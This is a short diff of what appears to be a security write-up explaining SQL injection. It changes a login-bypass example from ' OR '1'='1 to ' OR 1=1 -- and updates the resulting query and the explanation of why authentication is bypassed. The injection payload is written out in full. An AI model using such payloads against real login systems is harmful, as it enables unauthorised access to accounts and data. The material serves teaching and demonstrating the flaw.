@@ -26,17 +26,17 @@ This code directly interpolates user input into a SQL query string without sanit
 Login using the following credentials:
 
 ```
-Username: ' OR '1'='1
+Username: ' OR 1=1 --
 Password: anything
 ```
 
 **Constructed SQL Query:**
 
 ```sql
-SELECT * FROM users WHERE username = '' OR '1'='1' AND password = 'anything'
+SELECT * FROM users WHERE username = '' OR 1=1--' AND password = 'anything'
 ```
 
-Since `'1'='1'` is always true, the query returns the first user in the database, effectively bypassing authentication.
+Since `1=1` is always true, the query returns the first user in the database, effectively bypassing authentication.
 
 ---
 
